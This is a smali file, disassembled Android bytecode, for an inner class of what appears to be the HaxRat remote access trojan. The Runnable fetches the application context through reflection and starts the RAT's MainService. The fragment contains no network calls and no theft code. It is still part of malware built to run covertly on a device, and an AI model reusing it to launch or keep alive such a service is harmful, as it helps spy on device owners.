.class Lcom/hax4us/haxrat/MainService$100000001;
.super Ljava/lang/Object;
.source "MainService.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/hax4us/haxrat/MainService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000001"
.end annotation


# instance fields
.field private final val$currentApplication:Ljava/lang/reflect/Method;


# direct methods
.method constructor <init>(Ljava/lang/reflect/Method;)V
    .locals 5

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    invoke-direct {v3}, Ljava/lang/Object;-><init>()V

    move-object v3, v0

    move-object v4, v1

    iput-object v4, v3, Lcom/hax4us/haxrat/MainService$100000001;->val$currentApplication:Ljava/lang/reflect/Method;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 100
    move-object v0, p0

    move-object v4, v0

    :try_start_0
    iget-object v4, v4, Lcom/hax4us/haxrat/MainService$100000001;->val$currentApplication:Ljava/lang/reflect/Method;

    const/4 v5, 0x0

    check-cast v5, Ljava/lang/Object;

    const/4 v6, 0x0

    check-cast v6, [Ljava/lang/Object;

    invoke-virtual {v4, v5, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/content/Context;

    move-object v2, v4

    .line 101
    move-object v4, v2

    if-eqz v4, :cond_0

    .line 102
    move-object v4, v2

    invoke-static {v4}, Lcom/hax4us/haxrat/MainService;->startService(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_0
    return-void

    :catch_0
    move-exception v4

    move-object v2, v4

    goto :goto_0
.end method
